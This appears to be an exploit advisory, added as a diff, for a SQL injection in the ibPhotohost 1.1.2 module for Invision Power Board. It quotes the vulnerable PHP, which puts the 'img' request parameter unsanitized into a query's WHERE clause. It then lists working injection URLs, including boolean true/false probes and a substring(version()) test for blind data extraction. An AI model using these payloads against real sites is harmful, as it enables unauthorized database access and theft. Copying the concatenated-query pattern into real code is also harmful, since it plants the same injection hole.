@@ -1,0 +1,35 @@
+             
+#################################################
++
++  Title:       ibPhotohost 1.1.2 SQL Injection
++  Author:      fred777 - [fred777.5x.to]
++  Link:        http://mods.invisionize.com/index.php/f/7609
++  Vuln:        index.php?autocom=photohost&CODE=04&img=[SQL Injection]
++  Greetzz to:  back2hack,free-hack,hackbase,c-c
++  Contact:     nebelfrost77@googlemail.com
++
+#################################################
+  
+--[ Vuln Code ] --
+  
+$id = $this->ipsclass->input['img'];
+
+	$this->ipsclass->DB->simple_construct(array(
+	'select' => '*',
+	'from' => 'imgupload',
+	'where' => 'imgupload_id=' . $id,
+	'order' => 'imgupload_date asc'
+	));
+  
+################################################
+  
+--[ Exploitable ]--
+  
+http://site/index.php?autocom=photohost&CODE=04&img=[SQL Injection]
+
+http://site/index.php?autocom=photohost&CODE=04&img=1+and+1=1--+ => true
+http://site/index.php?autocom=photohost&CODE=04&img=1+and+1=0--+ => false
+
+http://site/index.php?autocom=photohost&CODE=04&img=1+and+substring(version(),1,1)=5
+
+################################################
